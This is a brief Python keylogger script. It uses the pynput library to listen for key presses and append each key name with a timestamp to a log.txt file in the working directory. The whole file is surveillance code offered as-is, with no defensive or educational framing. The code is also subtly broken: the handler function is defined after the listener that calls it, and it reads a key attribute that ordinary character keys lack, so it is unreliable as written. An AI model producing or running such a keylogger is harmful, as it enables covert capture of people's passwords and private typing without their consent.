import logging
import time
import os
import sys
from pynput.keyboard import Key, Listener
 
file_path = '%s\log.txt' % os.getcwd()
 # create a log_file to hold the output
with open(file_path, 'a+') as fp:
      print('Logging started.... Press Ctrl + c to stop', file=sys.stdout)
      try:
        with Listener(on_press=lambda x : record_key_press(x,fp)) as listener:
            listener.join()
      except Exception:
        logging.exception('Exception occured during keylogger')
 
def record_key_press(x: Key,f): f.write("Key Pressed: {} at time {}\n".format(x.name,time.strftime("%H:%M:%S", time.gmtime())))